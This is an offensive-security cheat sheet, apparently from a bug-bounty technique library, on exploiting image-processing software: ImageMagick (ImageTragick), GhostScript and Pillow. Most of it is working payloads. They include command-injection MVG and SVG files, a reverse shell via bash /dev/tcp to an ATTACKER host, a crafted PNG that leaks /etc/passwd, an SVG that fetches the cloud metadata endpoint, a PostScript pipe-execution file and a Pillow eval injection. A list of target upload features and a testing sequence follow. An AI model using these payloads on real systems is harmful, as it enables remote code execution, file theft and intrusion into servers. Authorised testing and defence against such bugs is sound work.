---
id: "image-processing-attacks"
title: "ImageTragick & Image Processing Vulnerabilities"
type: "technique"
category: "web-application"
subcategory: "file-processing"
tags: ["imagetragick", "imagemagick", "ghostscript", "pillow", "rce", "ssrf", "file-read", "deep-dig"]
platforms: ["linux", "macos", "windows"]
related: ["file-upload", "ssrf-techniques", "command-injection-payloads"]
difficulty: "advanced"
updated: "2026-04-14"
---

# ImageTragick & Image Processing Vulnerabilities

## Why Image Processing Bugs are Critical
Every app with image upload does server-side processing (resize, thumbnail, convert). ImageMagick, GhostScript, and Pillow have had devastating RCE and file-read CVEs. $5k–$50k.

## ImageTragick (CVE-2016-3714) — RCE
```
# exploit.mvg:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|id;echo ")'
pop graphic-context

# exploit.svg:
<?xml version="1.0" standalone="no"?>
<svg width="640px" height="480px">
<image xlink:href='https://example.com/x.jpg"|id;echo "' x="0" y="0" height="640px" width="480px"/>
</svg>

# Reverse shell:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/x.jpg"|bash -i >& /dev/tcp/ATTACKER/4444 0>&1;echo "a)'
pop graphic-context
```

## CVE-2022-44268 — Arbitrary File Read via PNG
```bash
# Create PNG that exfiltrates /etc/passwd when processed:
pngcrush -text a "profile" "/etc/passwd" input.png output.png

# Upload output.png → download the processed/resized image
# Extract exfiltrated data:
identify -verbose processed.png | grep -A 100 "Raw profile"
# File contents are hex-encoded in the PNG metadata
python3 -c "print(bytes.fromhex('HEX_DATA').decode())"
```

## ImageMagick SSRF via SVG
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" height="200" width="200"/>
</svg>
```

## GhostScript RCE (CVE-2023-36664)
```postscript
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```

## Pillow (Python PIL) Exploitation
```python
# CVE-2022-22817 — eval injection via ImageMath:
from PIL import ImageMath
ImageMath.eval("exec(compile('import os;os.system(\"id\")','','exec'))")

# Decompression bomb (DoS):
# Tiny file that expands to enormous size in memory
```

## Where to Find This
- Profile picture upload
- Image resizing/thumbnail generation
- Document converters (PDF ↔ image)
- E-commerce product image upload
- CMS media libraries (WordPress, Drupal)
- Any backend using ImageMagick convert/identify/mogrify
- OCR processing pipelines
- CI/CD processing screenshots

## Testing Methodology
```
1. Upload a .svg with SSRF payload — does it make an HTTP request?
2. Upload .mvg file if accepted — test for ImageTragick RCE
3. Upload crafted PNG (CVE-2022-44268) — check metadata of processed image
4. Upload PostScript/EPS — test for GhostScript RCE
5. Test supported formats: SVG, MVG, MSL, EPS, PS, PDF
6. Check if ImageMagick policy.xml restricts dangerous coders
```

## Tools
- pngcrush (craft metadata payloads)
- exiftool (inspect processed images)
- Burp Suite for upload interception
- nuclei ImageMagick templates
- identify -verbose (check if IM processed your payload)
